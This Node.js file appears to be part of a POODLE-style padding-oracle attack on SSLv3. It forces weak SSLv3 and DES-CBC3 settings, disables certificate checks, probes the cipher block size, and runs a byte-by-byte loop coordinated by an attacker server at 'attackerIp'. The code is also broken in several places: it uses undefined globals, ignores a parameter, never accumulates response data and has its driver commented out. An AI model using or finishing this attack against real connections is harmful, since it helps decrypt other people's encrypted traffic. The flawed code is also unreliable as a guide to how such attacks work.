const https = require('https');
const url = require('url');

var blockSize = null;

function sendRequest(method, urlStr, data, callback, errorcallback, timeout) {
    const parsedUrl = url.parse(urlStr);

    const sslOptions = {
        port: 443,
        ciphers: 'DES-CBC3-SHA',
        secureProtocol: 'SSLv3_method',
        rejectUnauthorized: false
    };

    const defaultOptions = {
        hostname: parsedUrl.hostname,
        path: parsedUrl.path,
        method: method || 'GET',
    }

    //もしもSSLv3への通信であるのならば、SSLv3用のオプションがないと鍵交換等でエラーが出てしまうため指定しておく
    if (parsedUrl.hostname === "testdomain.com") {
        for (var key in sslOptions) {
            if (sslOptions.hasOwnProperty(key)) {
                defaultOptions[key] = sslOptions[key];
            }
        }
    }


    const req = https.request(defaultOptions, function (res) {
        var responseData = '';
        res.on('data', function (chunk) {
            callback && callback(chunk);
        });
        res.on('end', function () {
            if (callback) callback(responseData);
        });
    });

    req.on('error', function (err) {
        errorcallback && errorcallback(err.code, err.message);
    });

    req.setTimeout(timeout || 5000, function () {
        req.abort();
        if (errorcallback) errorcallback('ETIMEDOUT', 'Request timed out');
    });

    if (data) {
        req.write(Array(101).join('a') + data);
    }

    req.end();
}

function attackByte(dataLengthNeeded) {
    sendRequest('GET', 'http://' + attackerIp + "/offset", null, function (response) {
        var offset = parseInt(response, 10);
        data = "";
        path = "";
        if (offset > dataLengthNeeded) dataLengthNeeded += blockSize;
        var done = false;

        var attackerInterval = setInterval(function () {
            sendRequest('POST', targetUrl + "/" + path, data, function () {
                if (done) return;
                done = true;
                clearInterval(attackerInterval);
                attackByte(dataLengthNeeded);
            });
        }, 100)
    });
}

function sendBlockSizeRequest(attackerIp, targetUrl, options) {
    if (blockSize !== null) return;
    var blockSizeString = 'a';

    function checkBlockSize() {
        sendRequest('GET', targetUrl + '/' + blockSizeString, null, function () {
            blockSizeString += 'a';
            checkBlockSize();
        }, function (errCode, errMsg) {
            console.error('Error in blockSize request:', errCode, errMsg);
        }, 5000, options);
    }

    checkBlockSize();
}

var blockSizeString = ""

//sendRequest('GET', 'http://' + attackerIp + "/blocksize", null, function (response) {
//    blockSize = parseInt(response.split(' ')[0], 10);
//    var dataLengthNeeded = parseInt(response.split(' ')[1], 10);
//
//    attackByte(dataLengthNeeded + blockSize);
//}, null, 30000);
//
//
//function sendBlockSizeRequest() {
//    if (blockSize !== null) return;
//    blockSizeString += "a"
//    sendRequest('GET', targetUrl + "/" + blockSizeString, null, sendBlockSizeRequest);
//}
//
//sendBlockSizeRequest();

sendRequest('GET', 'https://testdomain.com', null, function (response) {
    console.log(response.toString());
}, function (res) {
    console.log("error");
}, 30000);